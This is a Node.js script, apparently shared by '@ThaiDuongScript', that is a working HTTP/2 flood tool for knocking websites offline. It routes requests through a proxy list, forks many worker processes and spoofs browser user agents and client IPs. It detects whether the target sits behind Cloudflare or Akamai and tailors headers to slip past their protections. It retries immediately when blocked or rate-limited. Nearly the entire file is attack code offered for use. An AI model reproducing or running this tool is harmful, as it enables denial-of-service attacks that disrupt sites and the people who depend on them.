//Code by @ThaiDuongScript | Share with love
// Custom bypass with http/2 stream
// Low rq




console.log = function () {};
const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, cluster = require('cluster')
const crypto = require('crypto');
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const errorHandler = error => {
 
	console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
function randstrc(length) {
		const characters = "xX";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
function randstrd(length) {
		const characters = "0Ox";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
var parsed = url.parse(process.argv[2]);
const lookupPromise = util.promisify(dns.lookup);
let val 
let isp
let pro
async function getIPAndISP(url) {
  try {
    const { address } = await lookupPromise(url);
    const apiUrl = `http://ip-api.com/json/${address}`;
    const response = await fetch(apiUrl);
    if (response.ok) {
      const data = await response.json();
       isp = data.isp;
      console.log('ISP ', url, ':', isp);
	  if (isp === 'Cloudflare, Inc.') {
		 pro =[ 
			{'Accept-Signature' : randstrd(32)},
		   {'Quic-Version' : randstrd(1) + randstrc(1) +randstrd(10)},
			{'Signature' : randstrc(12) + randstrc(12)},
		]
		  val = { 'NEl': JSON.stringify({
			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
			"include_subdomains": Math.random() < 0.5 ? true : false}) 
		  }
	  }else if (isp === 'Akamai Technologies, Inc.' && 'Akamai International B.V.') {
		 pro = {'Quic-Version' : '0x00000001'}
		val = { 'NEl': JSON.stringify({
			"report_to":"default",
			"max_age":3600,
			"include_subdomains":true}),
		  }
	  } else {
		val = {'Etag': randstrc(10) + randstrd(20)}
		pro = {'Strict-Transport-Security': 'max-age=' + randstrd(6)}
           
	  }
    } else {
     return
    }
  } catch (error) {
    return
  }
}

const targetURL = parsed.host; 

getIPAndISP(targetURL);

try {
	var colors = require('colors');
} catch (err) {
	console.log('\x1b[36mInstalling\x1b[37m the requirements');
	execSync('npm install colors');
	console.log('Done.');
	process.exit();
}
cplist = [
		'TLS_AES_256_GCM_SHA384',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_128_GCM_SHA256',
     'ECDHE-ECDSA-AES128-GCM-SHA256',
     'ECDHE-ECDSA-CHACHA20-POLY1305'
		, ]
		

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
function randomIp() {
	const segment1 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? nh?t (0-255)
	const segment2 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? hai (0-255)
	const segment3 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? ba (0-255)
	const segment4 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? t? (0-255)
	return `${segment1}.${segment2}.${segment3}.${segment4}`;
}

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
let input = process.argv[7];
// Validate input
if (!target || !time || !thread || !proxyFile || !rps || !input) {
	console.log('HTTP-FLOOD'.bgRed)
	console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rate bypass/flood`.rainbow);
	process.exit(1);
}
// Validate target format
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
// Parse proxy list
let proxys = [];
try {
	const proxyData = fs.readFileSync(proxyFile, 'utf-8');
	proxys = proxyData.match(/\S+/g);
} catch (err) {
	console.error('Error proxy file:', err.message);
	process.exit(1);
}
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const proxyr = () => {
	return proxys[Math.floor(Math.random() * proxys.length)];
}
if (cluster.isMaster) {
	console.clear()
	console.log(`success attack`.bgRed)
		, console.log(`flood`.yellow)
process.stdout.write("");
setTimeout(() => {
  process.stdout.write("");
}, 500 * time );

setTimeout(() => {
  process.stdout.write("");
}, time * 1000);
	for (let i = 0; i < thread; i++) {
		cluster.fork();
	}
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	if (input === 'flood') {
	const abu =	setInterval(function() {
			flood()
		}, 1);
	}else {
	setInterval(flood)
}
}

async function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	
	var proxy = proxyr().split(':');
	var randIp = randomIp();
	let interval
	if (input === 'flood') {
	  interval = 1000;
	} else if (input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
  
	  // T?o m?t ?? tr? ng?u nhi?n t? 1000 ??n 5000 mili gi?y
	  interval = randomDelay(1000, 5000);
	} else {
	  interval = 1000;
	}
  
  
	  const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
 ]; 
lang_header = [
        "en-US,en;q=0.8",
        "en-US,en;q=0.5",
        "en-US,en;q=0.9",
        "en-US,en;q=0.7",
        "en-US,en;q=0.6",

        //Chinese
        "zh-CN,zh;q=0.8",
        "zh-CN,zh;q=0.5",
        "zh-CN,zh;q=0.9",
        "zh-CN,zh;q=0.7",
        "zh-CN,zh;q=0.6",

        //Spanish
        "es-ES,es;q=0.8",
        "es-ES,es;q=0.5",
        "es-ES,es;q=0.9",
        "es-ES,es;q=0.7",
        "es-ES,es;q=0.6",

        //French
        "fr-FR,fr;q=0.8",
        "fr-FR,fr;q=0.5",
        "fr-FR,fr;q=0.9",
        "fr-FR,fr;q=0.7",
        "fr-FR,fr;q=0.6",

        //German
        "de-DE,de;q=0.8",
        "de-DE,de;q=0.5",
        "de-DE,de;q=0.9",
        "de-DE,de;q=0.7",
        "de-DE,de;q=0.6",

        //Italian
        "it-IT,it;q=0.8",
        "it-IT,it;q=0.5",
        "it-IT,it;q=0.9",
        "it-IT,it;q=0.7",
        "it-IT,it;q=0.6",

        //Japanese
        "ja-JP,ja;q=0.8",
        "ja-JP,ja;q=0.5",
        "ja-JP,ja;q=0.9",
        "ja-JP,ja;q=0.7",
        "ja-JP,ja;q=0.6",

        //En + Russian
        "en-US,en;q=0.8,ru;q=0.6",
        "en-US,en;q=0.5,ru;q=0.3",
        "en-US,en;q=0.9,ru;q=0.7",
        "en-US,en;q=0.7,ru;q=0.5",
        "en-US,en;q=0.6,ru;q=0.4",

        //En + Chinese
        "en-US,en;q=0.8,zh-CN;q=0.6",

        //En + Spanish
        "en-US,en;q=0.8,es-ES;q=0.6",

        //En + French
        "en-US,en;q=0.8,fr-FR;q=0.6",

        //En + German
        "en-US,en;q=0.8,de-DE;q=0.6",
 ];
 
 const encoding_header = [
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'gzip, deflate, br',
  'deflate',
  'deflate',
 ];
 
 const control_header = [
  'max-age=604800',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'max-age=0',
 ];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
	const mediaTypes = [
		'text/html'
		, 'application/xhtml+xml'
		, 'application/xml'
		, 'image/avif'
		, 'image/webp'
		, 'image/apng'
		, '/'
		, 'application/signed-exchange'
	];
	const acceptValues = [];
	mediaTypes.forEach((type, index) => {
		const quality = index === 0 ? 1 : (Math.random() * 0.9 + 0.1).toFixed(1);
		acceptValues.push(`${type};q=${quality}`);
	});
	const acceptHeader = acceptValues.join(',');
	  
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
function randstrb(length) {
		const characters = "01";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
	
	function aString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
	const randstrsValue = randstr(25);
	
 	function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
const a = getRandomInt(108,131);
const b = getRandomInt(108,128);
const c = getRandomInt(108,129);
const d = getRandomInt(108,131);
const e = getRandomInt(108,127);
var operatingSystems = ["Windows NT 10.0", "Macintosh", "X11"];
var architectures = {
  "Windows NT 10.0": `Win64; x64`,
  "Macintosh": `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}`  ,
  "X11": Math.random() < 0.5 ? `Linux x86_64; rv:${a}.0` : `Linux x86_64`
};



function getRandomValue(arr) {
  const randomIndex = Math.floor(Math.random() * arr.length);
  return arr[randomIndex];
}

const randomOS = getRandomValue(operatingSystems);
const randomArch = architectures[randomOS]; 


var uas =  `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${a}.0.0.0 Safari/537.36`
var ua1 = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${b}.0.0.0 Safari/537.36 Edg/${b}`
var ua2 = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${c}.0.0.0 Safari/537.36 OPR/${c}`
var uass = `Mozilla/5.0 (${randomOS}; ${randomArch}; rv:${d}.0) Gecko/20100101 Firefox/${d}`

var uasss = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${e}.0.0.0 Safari/537.36 Brave/${e}.0.0.0`


let ch_ua_v;
    if (randomOS === "Windows NT 10.0") {
        ch_ua_v = `Windows`;
    }
else if (randomOS === "Macintosh") {
        ch_ua_v = `macOSX`;
    }
 else if (randomOS === "X11") {
        ch_ua_v = `Linux`;
    }


const ch_ua_ver = `${ch_ua_v}`;

	

function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
 const DAY = ["Mon","Tue","Wed","Thu","Fri","Sat","Sun"];
const DAY1 = getRandomInt(1,30);
const month = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];



var day = DAY[Math.floor(Math.floor(Math.random() * DAY.length))];
var day1 = month[Math.floor(Math.floor(Math.random() * month.length))];



var duong = randstrb(100*thread);




   hd = {}
     header = {
		':authority' : parsed.host,
		':scheme': 'https',
		':path': parsed.path,
		':method': 'GET'
	 }
	header["priority"] = "u=0, i";
	header["accept-encoding"] = 'gzip, br';
	header["sec-ch-ua-mobile"] = "?0";
	header["upgrade-insecure-requests"] = "1";
  header["sec-fetch-dest"] = "document";
 header["sec-fetch-mode"] = "navigate";
 header["sec-fetch-site"] = "none";
 header["sec-fetch-user"] = "1";
header["If-Modified-Since"] = day + "," + DAY1 + " " + day1 + " " + randstra(4) + " " + randstra(2) + ":" + randstra(2) + ":" + randstra(2) + "GMT";
const rateHeaders = [
{ "A-IM": "Feed" },
{ "accept": accept },
{ "accept-charset": accept },
{ "accept-datetime": accept },
{ "viewport-height":"1080"  },
{ "viewport-width": "1920"  },
];

const rateHeaders2 = [
{ "Via": "HTTP/1.1" + randstr(3) },
{ "X-Requested-With": "XMLHttpRequest" },
{ "X-Forwarded-For": randIp },
{ "X-Vercel-Cache": control },
{ "Alt-Svc": "h2=" + 'parsed.host + ":443;"' + "ma=604800" },
{ "Alt-Used": parsed.host + ":443"},
{ "te": "trailers" },
];

const rateHeaders4 = [
{ "accept-encoding": encoding },
{ "accept-language": lang },
{ "Refresh": "5" },
{ "X-Content-Type-Options": "nosniff" },
{ "device-memory": "0.25"  },
{ "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'false' },
];
const rateHeaders5 = [
{ "HTTP-FROM-KNOWN-BOTNET": randstrc(81) },
{ "Access-Control-Request-Method": "GET" },
{ "Cache-Control": "no-cache" },
{ "Content-Encoding": "gzip" },
{ "content-type": "text/html" },
{ "origin": "https://" + parsed.host },
{ "pragma": "no-cache" },
{ "referer": "https://" + parsed.host + "/" },
];
const brw = ['chrome','firefox','edge','macos','linux','opera']
let dynHeaders
let ci
let bruh 
async function rand() {
	var browser = brw[Math.floor(Math.random() * brw.length)]
	if (browser === 'chrome') {
    
	 dynHeaders = {
		
		
		...val,
		
        ...pro,
                        "user-agent" : uas,

					  };
					}else if (browser === 'firefox'){
						
						dynHeaders = {
							
							...val,
                            ...pro,
	
                  "user-agent" : uass,

										  };
					}else if (browser === 'edge'){
						
						dynHeaders = {
							
							...val,
                            ...pro,
                  "user-agent" : ua1,

										  };
					} else if (browser === 'opera') {
						
						dynHeaders = {
							...val,
...pro,
                  "user-agent" : ua2,

										  };
					} else if (browser === 'linux') {
						dynHeaders = {
							...val,
                            ...pro,
							                  "user-agent" : uasss,
										  };
					} else if (browser === 'macos') {
						dynHeaders = {
	
							...val,
                            ...pro,


							                  "user-agent" : ua1,
										  };
					} else {
						dynHeaders = {
							

							...val,
                            ...pro,
	
                  "user-agent" : uasss,
										  };
					}
					return dynHeaders
	
}
rand()
	const agent = await new http.Agent({		
		  keepAlive: true
		, keepAliveMsecs: 50000
		, maxSockets: 500
	, });
	const Optionsreq = {
		agent: agent
      , host: proxy[0]
		, port: proxy[1]
		, method: 'CONNECT'
		, path: parsed.host
		, timeout: 1000
		, headers: {
			'Host': parsed.host + ':443'
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'Keep-Alive'
			, 'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`
		, }
	, };
	connection = await http.request(Optionsreq, (res) => {});
 connection.on('error', (err) => {
 
 if (err) return
});
 connection.on('timeout', async () => {
		return
		});
	const TLSOPTION = {
		ciphers: cipper
		, secureProtocol:['TLSv1_3_method'] 
		, echdCurve: Math.random() < 0.5 ? "X25519" : "VIET69"
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']

	, };

	async function createCustomTLSSocket(parsed, socket) {
		const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		return tlsSocket;
	}

	  
 
	 
	connection.on('connect',async function (res, socket) {

		const tlsSocket = await createCustomTLSSocket(parsed, socket);

	const client =  http2.connect(parsed.href, {
			createConnection: () => tlsSocket
			, settings: {  
       initialWindowSize: 15564991,
  maxFrameSize : 236619,
			},
       socket: connection,
		});
   
		client.on("connect", async () => {

			setInterval(async () => {

				  const options = {
               ...header,
					...dynHeaders,
					"x-forwarded-proto": "https",
...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
                  ...rateHeaders5[Math.floor(Math.random()*rateHeaders5.length)],
                  ...rateHeaders4[Math.floor(Math.random()*rateHeaders4.length)],
                  ...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],
                 "x-forwarded-host": "id" + randstra(2) + ".cdn." + duong + ".com",
                "x-powered-by" : "LiteSpeed" + ":" + randstra(10),
               "xss": duong,
             "Client-IP": randIp,
             "Real-IP": randIp,
				  }
             //console.log(options)
		  	for (let i = 0; i < rps; i++) {
  const request = client.request(options)
    
               .on('response', response => {
request.setEncoding('utf8');
if (response[":status"] === 403) {
                          //console.log('"IP"'.rainbow, proxy[0],'"403 (FORBIDDEN)"'.red),
                        
         request.close();
			request.destroy();
			return flood()
  }
else if (response[":status"] === 429) {
                          //console.log('"IP"'.rainbow, proxy[0],'"429 (RATE LIMITED)"'.blue),
                        
         request.close();
         return flood()
  }
else if (response[":status"] === 200) {
                          //console.log('"IP"'.rainbow, proxy[0],'"200 (OK)"'.yellow),
                        
         flood()
  }
else if (response[":status"] >= 500) {
                          //console.log('"IP"'.rainbow, proxy[0],"CONNECTED TIME OUT"),
                        
         flood()
  }
              
               request.close()
               });
               request.end(); 
               

           }
       }, 100);
    });

		//client.on("close", () => {
			//client.destroy();
			//tlsSocket.destroy();
			//socket.destroy();
			//return flood()
		//});

		//client.on('timeout', async () => {
		//client.destroy();
	   //tlsSocket.destroy();
		//return flood()
		//});



client.on("error", (error) => {
   if (error.code === 'ERR_HTTP2_INVALID_SESSION') {
      return flood()
      setTimeout(() => {
         
      },100);
  } else if (error.code === 'ERR_HTTP2_ERROR') {
      
      shouldPauseRequests = false;
      setTimeout(() => {
          
          shouldPauseRequests = false;
      }, 100);
	        if (error){
				client.destroy();
				socket.destroy();
				 return flood()
			}
 }
});

	});

connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//
